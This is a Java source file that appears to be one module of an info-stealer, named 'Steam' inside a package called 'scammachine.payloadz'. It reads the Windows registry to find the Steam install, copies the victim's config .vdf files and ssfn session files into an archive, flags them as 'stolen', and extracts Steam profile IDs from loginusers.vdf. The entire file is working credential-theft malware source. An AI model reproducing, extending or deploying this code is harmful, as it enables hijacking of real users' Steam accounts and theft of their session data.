package me.teejayx6.scammachine.payloadz;

import me.teejayx6.scammachine.util.ArchiveUtil;
import me.teejayx6.scammachine.util.FileUtils;
import me.teejayx6.scammachine.util.TempFile;
import me.teejayx6.scammachine.util.WindowsRegistry;

import java.io.File;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Steam
{
    public static boolean stolen = false;

    public static String execute()
    {
        String path = WindowsRegistry.readRegistry("HKLM\\SOFTWARE\\WOW6432Node\\Valve\\Steam", "InstallPath");

        if (path != null)
        {
            if (!path.endsWith("\\"))
                path += "\\";

            File folder = new File(path);
            if (folder != null)
            {
                File[] files = folder.listFiles();
                if (files != null)
                {
                    for (File f : files)
                    {
                        if (f.isDirectory())
                        {
                            if (f.getName().equalsIgnoreCase("config"))
                            {
                                // vdf
                                File[] configfolder = f.listFiles();
                                if (configfolder != null)
                                {
                                    for (File f2 : configfolder)
                                    {
                                        if (!f2.isDirectory() && f2.getName().contains("vdf"))
                                        {
                                            try
                                            {
                                                TempFile tmp = FileUtils.readFile(f2.getAbsolutePath());
                                                if (tmp != null)
                                                {
                                                    stolen = true;
                                                    ArchiveUtil.addFile("Steam/config/" + f2.getName(), tmp.bytes);
                                                    FileUtils.close(tmp);
                                                }
                                            }
                                            catch (Exception e)
                                            {

                                            }
                                        }
                                    }
                                }
                            }
                        }
                        else
                        {
                            if (f.getName().contains("ssfn"))
                            {
                                try
                                {
                                    TempFile tmp = FileUtils.readFile(f.getAbsolutePath());
                                    if (tmp != null)
                                    {
                                        stolen = true;
                                        ArchiveUtil.addFile("Steam/" + f.getName(), tmp.bytes);
                                        FileUtils.close(tmp);
                                    }
                                }
                                catch (Exception e)
                                {

                                }
                            }
                        }
                    }
                }
            }

            StringBuilder sb = new StringBuilder();
            String users = path + "config\\loginusers.vdf";
            File usersfile = new File(users);
            if (usersfile != null && usersfile.exists() && !usersfile.isDirectory())
            {
                try
                {
                    Scanner scanner = new Scanner(usersfile);
                    while (scanner.hasNextLine())
                    {
                        String line = scanner.nextLine();
                        if (line != null)
                        {
                            Pattern p = Pattern.compile("\"76(.*?)\"");
                            Matcher m = p.matcher(line);

                            while (m.find())
                            {
                                stolen = true;
                                String profile = m.group();
                                profile = profile.substring(1, profile.length() - 1);
                                sb.append("https://steamcommunity.com/profiles/" + profile + "/\n");
                            }
                        }
                    }
                }
                catch (Exception e)
                {

                }
            }

            if (sb.length() > 0)
                return sb.toString();
        }

        return "None";
    }
}
